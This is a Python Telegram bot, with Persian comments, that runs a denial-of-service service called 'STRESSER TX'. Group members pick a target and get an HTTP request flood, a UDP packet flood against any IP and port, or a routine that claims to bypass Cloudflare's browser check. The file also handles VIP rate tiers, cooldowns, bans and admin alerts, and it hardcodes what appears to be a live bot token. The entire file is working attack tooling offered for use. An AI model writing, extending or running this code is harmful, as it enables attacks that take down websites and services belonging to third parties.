import telebot
import threading
import socket
import requests
import time
import random
import urllib.parse
import json
import asyncio
import aiohttp
import os
import sys
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from colorama import init, Fore

init()

# توکن ربات و آیدی ادمین
TOKEN = "8794483760:AAFUWSAv657LA01GfDUZSeOyc6VLhfAfwOI"
ADMIN_ID = "8309402437"
GROUP_LINK = "https://t.me/+Dzray-5fpA9jMDU0"

bot = telebot.TeleBot(TOKEN)

# فایل‌ها
BANNED_FILE = "banned_users.json"
VIP_FILE = "vip_users.json"
BLOCKED_URLS_FILE = "blocked_urls.json"
MUTE_FILE = "muted_users.json"
COOLDOWN_FILE = "cooldowns.json"

# قفل برای جلوگیری از خراب شدن فایل‌های JSON در تردهای موازی
file_lock = threading.Lock()

def load_json(filename, default):
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as f:
                return json.load(f)
        except:
            return default
    return default

def save_json(filename, data):
    with file_lock:
        with open(filename, 'w') as f:
            json.dump(data, f)

# بارگذاری دیتا
banned_users = set(load_json(BANNED_FILE, []))
vip_users = load_json(VIP_FILE, {})
blocked_urls = set(load_json(BLOCKED_URLS_FILE, []))
muted_users = load_json(MUTE_FILE, {})
cooldowns = load_json(COOLDOWN_FILE, {})

def save_banned(): save_json(BANNED_FILE, list(banned_users))
def save_vip(): save_json(VIP_FILE, vip_users)
def save_blocked(): save_json(BLOCKED_URLS_FILE, list(blocked_urls))
def save_mute(): save_json(MUTE_FILE, muted_users)
def save_cd(): save_json(COOLDOWN_FILE, cooldowns)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
]

user_data = {}
attack_threads = {}  # مدیریت استپ کردن اتک برای هر چت جداگانه

def is_admin_or_member(chat_id):
    try:
        chat_member = bot.get_chat_member(chat_id, int(ADMIN_ID))
        return chat_member.status in ['creator', 'administrator', 'member']
    except Exception as e:
        print(f"Debug: Error checking admin/member status - {str(e)}")
        return False

def detect_protection(headers):
    server = headers.get('server', '').lower()
    if 'cf-ray' in headers or 'cloudflare' in server: return "Cloudflare"
    elif 'ddos-guard' in server: return "DDoS-Guard"
    elif 'sucuri' in server: return "Sucuri"
    return "Unknown"

def check_status(target):
    try:
        start_time = time.time()
        response = requests.get(target, timeout=3)
        elapsed = (time.time() - start_time) * 1000
        return f"🟢 Active - {elapsed:.2f}ms" if response.status_code == 200 else f"🟡 Code: {response.status_code}"
    except:
        return "🔴 Down"

# ----------------- Attack Functions -----------------

def get_max_rps(user_id):
    if user_id == ADMIN_ID:
        return 99999  # ادمین بدون محدودیت
    if user_id in vip_users:
        if datetime.now() < datetime.strptime(vip_users[user_id]["expiration"], "%Y-%m-%d %H:%M:%S"):
            return vip_users[user_id].get('max_rps', 3300)
    return 2970

async def async_layer7_attack(target, duration, rps, stop_event, user_id):
    max_rps = get_max_rps(user_id)
    actual_rps = min(rps, max_rps)
    
    async with aiohttp.ClientSession() as session:
        stop_time = time.time() + duration
        
        async def send_request():
            while time.time() < stop_time and not stop_event.is_set():
                try:
                    headers = {"User-Agent": random.choice(user_agents)}
                    async with session.get(target, headers=headers, timeout=3):
                        pass
                except:
                    pass

        tasks = [asyncio.ensure_future(send_request()) for _ in range(actual_rps)]
        await asyncio.gather(*tasks)

def layer4_attack(target_ip, port, duration, rps, stop_event, user_id):
    max_rps = get_max_rps(user_id)
    actual_rps = min(rps, max_rps)
    stop_time = time.time() + duration
    packet = random._urandom(1024)

    def send_packet():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(duration)
        while time.time() < stop_time and not stop_event.is_set():
            try:
                s.sendto(packet, (target_ip, port))
            except:
                pass
        s.close()

    threads = []
    for _ in range(actual_rps):
        t = threading.Thread(target=send_packet)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

async def bypass_cloudflare_uam(target):
    async with aiohttp.ClientSession() as session:
        headers = {"User-Agent": random.choice(user_agents)}
        try:
            async with session.get(target, headers=headers, timeout=10) as response:
                text = await response.text()
                if "cloudflare" in text.lower() and "checking your browser" in text.lower():
                    await asyncio.sleep(5)  # Wait for JS challenge
                    async with session.get(target, headers=headers, timeout=10) as final_response:
                        if final_response.status == 200:
                            return True, "🟢 UAM Bypassed Successfully"
                        return False, "🔴 Failed to Bypass UAM"
                return True, "🟢 No UAM Detected"
        except Exception as e:
            return False, f"🔴 Error: {str(e)}"

def run_async_bypass(target):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(bypass_cloudflare_uam(target))
    loop.close()
    return result

def update_status(chat_id, message_id, target, target_ip, layer, method, duration, rps, protection, stop_event):
    remaining_time = duration
    while remaining_time > 0 and not stop_event.is_set():
        status = check_status(target) if layer == "L7" else "🟡 UDP - No ping"
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("Stop Attack", callback_data="stop_attack"))
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                                  text=f"🚀 Attack Running\nTarget: {target}\nIP: {target_ip}\nLayer: {layer}\nMethod: {method}\nDuration: {remaining_time}s\nRPS: {rps}\nProtection: {protection}\nStatus: {status}", reply_markup=markup)
        except:
            pass # Ignore "message not modified" error
        time.sleep(3)
        remaining_time -= 3

# ----------------- Bot Handlers -----------------

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id

    if user_id in banned_users:
        bot.reply_to(message, "🚫 شما بن شده‌اید!")
        return

    if user_id != ADMIN_ID and user_id in cooldowns and time.time() < cooldowns[user_id]:
        bot.reply_to(message, f"⏳ Cool Down {int(cooldowns[user_id] - time.time())}s")
        return

    if user_id != ADMIN_ID and message.chat.type == 'private':
        bot.reply_to(message, "🚫 برای استفاده از STRESSER TX باید به این گروه بروید: " + GROUP_LINK)
        return
    
    if message.chat.type in ['group', 'supergroup']:
        if not is_admin_or_member(chat_id):
            bot.reply_to(message, "🚫 ادمین در این گروه نیست. ربات ترک می‌کند.")
            bot.leave_chat(chat_id)
            return
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Layer 7", callback_data="L7"), InlineKeyboardButton("Layer 4", callback_data="L4"))
    bot.send_message(chat_id, "🔥 Welcome to DDoS API Bot\nSelect attack layer:", reply_markup=markup)

@bot.message_handler(commands=['ban', 'unban', 'vip', 'unvip', 'block'])
def admin_commands(message):
    user_id = str(message.from_user.id)
    if user_id != ADMIN_ID: return
    
    args = message.text.split()
    cmd = args[0][1:]
    
    if cmd == 'ban' and len(args) == 2:
        banned_users.add(args[1]); save_banned()
        bot.reply_to(message, f"✅ کاربر {args[1]} بن شد.")
    elif cmd == 'unban' and len(args) == 2:
        if args[1] in banned_users: banned_users.remove(args[1]); save_banned()
        bot.reply_to(message, f"✅ کاربر {args[1]} آن‌بان شد.")
    elif cmd == 'vip' and len(args) == 5:
        _, uid, days, max_time, max_rps = args
        expiration = (datetime.now() + timedelta(days=int(days))).strftime("%Y-%m-%d %H:%M:%S")
        vip_users[uid] = {"expiration": expiration, "max_time": int(max_time), "max_rps": int(max_rps)}
        save_vip()
        bot.reply_to(message, f"✅ VIP set for {uid}")
    elif cmd == 'unvip' and len(args) == 2:
        if args[1] in vip_users: del vip_users[args[1]]; save_vip()
        bot.reply_to(message, f"✅ VIP removed for {args[1]}")
    elif cmd == 'block' and len(args) == 2:
        blocked_urls.add(args[1]); save_blocked()
        bot.reply_to(message, f"✅ URL {args[1]} blocked.")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id
    user_id = str(call.from_user.id)
    
    if user_id in banned_users:
        bot.answer_callback_query(call.id, "🚫 بن شده‌اید!"); return
        
    if call.data in ["L7", "L4"]:
        user_data[chat_id] = {"layer": call.data, "step": "awaiting_method", "user_id": user_id}
        markup = InlineKeyboardMarkup()
        if call.data == "L7":
            markup.add(InlineKeyboardButton("HTTPS", callback_data="HTTPS"), InlineKeyboardButton("Bypass UAM", callback_data="BYPASS_UAM"))
        else:
            markup.add(InlineKeyboardButton("UDP", callback_data="UDP"))
        markup.add(InlineKeyboardButton("Back", callback_data="back_to_start"))
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"✅ Layer {call.data} selected\nSelect method:", reply_markup=markup)
        
    elif call.data == "back_to_start":
        if chat_id in user_data: del user_data[chat_id]
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("Layer 7", callback_data="L7"), InlineKeyboardButton("Layer 4", callback_data="L4"))
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔥 Welcome to DDoS API Bot\nSelect attack layer:", reply_markup=markup)
        
    elif call.data in ["HTTPS", "UDP", "BYPASS_UAM"]:
        if chat_id not in user_data: return
        user_data[chat_id]["method"] = call.data
        user_data[chat_id]["step"] = "awaiting_host"
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("Back", callback_data="back_to_start"))
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="✅ Method selected\nEnter target host:", reply_markup=markup)
        
    elif call.data == "stop_attack":
        stop_attack(chat_id, call.message.message_id)

@bot.message_handler(func=lambda message: True)
def handle_steps(message):
    chat_id = message.chat.id
    user_id = str(message.from_user.id)
    
    # بررسی Mute
    if user_id in muted_users and time.time() < muted_users[user_id]:
        try: bot.delete_message(chat_id, message.message_id)
        except: pass
        return
    elif user_id in muted_users:
        del muted_users[user_id]; save_mute()

    if user_id in banned_users: return
    if chat_id not in user_data or "step" not in user_data[chat_id]: return

    step = user_data[chat_id]["step"]
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("Back", callback_data="back_to_start"))

    if step == "awaiting_host":
        target = message.text
        if any(t in blocked_urls for t in [target, urllib.parse.urlparse(target).netloc]):
            bot.reply_to(message, "🚫 لینک بلاک شده است!"); return
        if not target.startswith("http") and user_data[chat_id]["layer"] == "L7":
            target = "http://" + target
        user_data[chat_id]["host"] = target
        user_data[chat_id]["step"] = "awaiting_duration"
        bot.reply_to(message, "⏳ Enter duration (seconds):", reply_markup=markup)

    elif step == "awaiting_duration":
        try:
            duration = int(message.text)
            max_time = 60
            if user_id == ADMIN_ID: max_time = 99999
            elif user_id in vip_users and datetime.now() < datetime.strptime(vip_users[user_id]["expiration"], "%Y-%m-%d %H:%M:%S"):
                max_time = vip_users[user_id]["max_time"]
            
            if duration > max_time:
                duration = max_time
                bot.reply_to(message, f"⚠️ Max time limit applied: {max_time}s")
            
            user_data[chat_id]["duration"] = duration
            user_data[chat_id]["step"] = "awaiting_rps"
            bot.reply_to(message, f"⏱ Duration: {duration}s\nEnter RPS:", reply_markup=markup)
        except ValueError:
            bot.reply_to(message, "❌ Invalid number!", reply_markup=markup)

    elif step == "awaiting_rps":
        try:
            rps = int(message.text)
            if rps < 1: raise ValueError
            user_data[chat_id]["rps"] = rps
            if user_data[chat_id]["layer"] == "L4":
                user_data[chat_id]["step"] = "awaiting_port"
                bot.reply_to(message, "🔌 Enter port (1-65535):", reply_markup=markup)
            else:
                start_attack(chat_id, user_id)
        except ValueError:
            bot.reply_to(message, "❌ Invalid RPS!", reply_markup=markup)

    elif step == "awaiting_port":
        try:
            port = int(message.text)
            if 1 <= port <= 65535:
                user_data[chat_id]["port"] = port
                start_attack(chat_id, user_id)
            else: raise ValueError
        except ValueError:
            bot.reply_to(message, "❌ Invalid port!", reply_markup=markup)

def start_attack(chat_id, user_id):
    if chat_id not in user_data: return
    target = user_data[chat_id]["host"]
    duration = user_data[chat_id]["duration"]
    rps = user_data[chat_id]["rps"]
    method = user_data[chat_id]["method"]
    layer = user_data[chat_id]["layer"]

    stop_event = threading.Event()
    attack_threads[chat_id] = stop_event

    try:
        if layer == "L7":
            host = urllib.parse.urlparse(target).hostname
            target_ip = socket.gethostbyname(host)
        else:
            clean_target = target.split("://")[1].split("/")[0] if "://" in target else target
            target_ip = socket.gethostbyname(clean_target)
    except socket.gaierror:
        bot.send_message(chat_id, "❌ Error: Cannot resolve host IP!")
        if chat_id in user_data: del user_data[chat_id]
        return

    bot.send_message(ADMIN_ID, f"⚠️ New Attack\nUser: {user_id}\nTarget: {target}\nIP: {target_ip}\nLayer: {layer}\nMethod: {method}\nDuration: {duration}s\nRPS: {rps}")

    protection = "Unknown"
    if layer == "L7":
        try:
            response = requests.get(target, headers={"User-Agent": random.choice(user_agents)}, timeout=3)
            protection = detect_protection(response.headers)
            initial_status = check_status(target)
        except:
            initial_status = "🔴 Down"
    else:
        initial_status = "🟡 UDP - No ping"

    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("Stop Attack", callback_data="stop_attack"))
    result_msg = bot.send_message(chat_id, f"🚀 Attack Started\nTarget: {target}\nIP: {target_ip}\nLayer: {layer}\nMethod: {method}\nDuration: {duration}s\nRPS: {rps}\nProtection: {protection}\nStatus: {initial_status}", reply_markup=markup)

    if method == "BYPASS_UAM":
        bot.send_message(chat_id, "⏳ Bypassing UAM... Please wait.")
        bypass_thread = threading.Thread(target=lambda: run_bypass(chat_id, result_msg.message_id, target, stop_event))
        bypass_thread.start()
    else:
        if layer == "L7":
            attack_func = lambda: asyncio.run(async_layer7_attack(target, duration, rps, stop_event, user_id))
        else:
            port = user_data[chat_id].get("port", 80)
            attack_func = lambda: layer4_attack(target_ip, port, duration, rps, stop_event, user_id)

        attack_task = threading.Thread(target=attack_func)
        status_thread = threading.Thread(target=update_status, args=(chat_id, result_msg.message_id, target, target_ip, layer, method, duration, rps, protection, stop_event))
        
        attack_task.start()
        status_thread.start()

        # استفاده از یک ترد دیگر برای مدیریت پایان اتک تا ربات قفل نشود
        def monitor_attack():
            attack_task.join()
            stop_event.set()
            status_thread.join()
            
            if user_id != ADMIN_ID:
                cooldowns[user_id] = time.time() + 60
                save_cd()
                
            final_status = check_status(target) if layer == "L7" else "🟡 UDP - No ping"
            bot.edit_message_text(chat_id=chat_id, message_id=result_msg.message_id,
                                  text=f"✅ Attack Finished\nTarget: {target}\nLayer: {layer}\nMethod: {method}\nStatus: {final_status}\nThanks to: @TEXOAR & Grok 3")
            if chat_id in attack_threads: del attack_threads[chat_id]
            if chat_id in user_data: del user_data[chat_id]

        monitor_thread = threading.Thread(target=monitor_attack)
        monitor_thread.start()

def run_bypass(chat_id, msg_id, target, stop_event):
    success, msg = run_async_bypass(target)
    stop_event.set()
    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"🚀 Bypass UAM Result\nTarget: {target}\nStatus: {msg}\nThanks to: @TEXOAR & Grok 3")
    if chat_id in attack_threads: del attack_threads[chat_id]
    if chat_id in user_data: del user_data[chat_id]

def stop_attack(chat_id, message_id):
    if chat_id in attack_threads:
        attack_threads[chat_id].set()
        bot.answer_callback_query(message_id, "⛔ Attack stopping...")
    else:
        bot.answer_callback_query(message_id, "No active attack found.")

# Error Handler
def handle_exceptions(exc_type, exc_value, exc_traceback):
    print(f"{Fore.RED}Error occurred: {exc_type.__name__} - {exc_value}{Fore.RESET}")

sys.excepthook = handle_exceptions

if __name__ == "__main__":
    print(f"{Fore.MAGENTA}DDoS API Bot Started!{Fore.RESET}")
    try:
        bot.get_updates(offset=-1)
        print(f"{Fore.GREEN}Old updates cleared successfully!{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.YELLOW}Warning: Could not clear updates - {str(e)}{Fore.RESET}")
        
    try:
        bot.polling(none_stop=True, allowed_updates=telebot.util.update_types)
    except Exception as e:
        print(f"{Fore.RED}Polling Error: {str(e)}{Fore.RESET}")
